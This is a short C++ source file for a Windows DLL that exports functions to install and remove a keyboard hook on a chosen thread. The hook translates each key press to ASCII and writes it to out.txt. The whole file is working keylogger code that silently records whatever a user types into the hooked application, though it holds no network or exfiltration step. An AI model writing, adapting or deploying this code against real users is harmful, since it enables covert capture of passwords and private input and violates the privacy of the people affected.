// dllmain.cpp : Defines the entry point for the DLL application.
#include "pch.h"
#include "Guard.h"

#define EXTERN_DLL_EXPORT extern "C" __declspec(dllexport)

HHOOK hKeyboardHook = NULL;
HINSTANCE hInstance = NULL;
file_handle outputFile(L"out.txt");

LRESULT CALLBACK KeyboardProc(int code, WPARAM wParam, LPARAM lParam)
{
    if (code >= 0 && code == HC_ACTION && ((lParam >> 30) & 1))
    {
        TCHAR msg[64];
        wsprintf(msg, TEXT("key press\n"));
        OutputDebugString(msg);

        if (wParam == VK_ESCAPE)
        {
            wsprintf(msg, TEXT("ESCAPE\n"));
            OutputDebugString(msg);
        }
        
        if ((wParam == VK_SPACE) || (wParam == VK_RETURN) || (wParam >= 0x2f))
        {
            BYTE ks[256];
            char ch = '\n';
            WORD w = NULL;
            UINT scan = 0;

            if (GetKeyboardState(ks))
            {   
                ToAscii(wParam, scan, ks, &w, 0);
                ch = char(w);
                outputFile.WriteToFile(&ch);
            }
        }
    }
    return CallNextHookEx(hKeyboardHook, code, wParam, lParam);
}

EXTERN_DLL_EXPORT BOOL CALLBACK SetKeyboardHook(DWORD thread)
{    
    if (!hKeyboardHook && hInstance && (thread > 0))
        hKeyboardHook = SetWindowsHookEx(WH_KEYBOARD, (HOOKPROC)KeyboardProc, hInstance, thread);
    return hKeyboardHook ? TRUE : FALSE;
}

EXTERN_DLL_EXPORT VOID CALLBACK UnhookKeyboardHook()
{
    if (hKeyboardHook)
        UnhookWindowsHookEx(hKeyboardHook);
    hKeyboardHook = NULL;
}

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        hInstance = hModule;
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

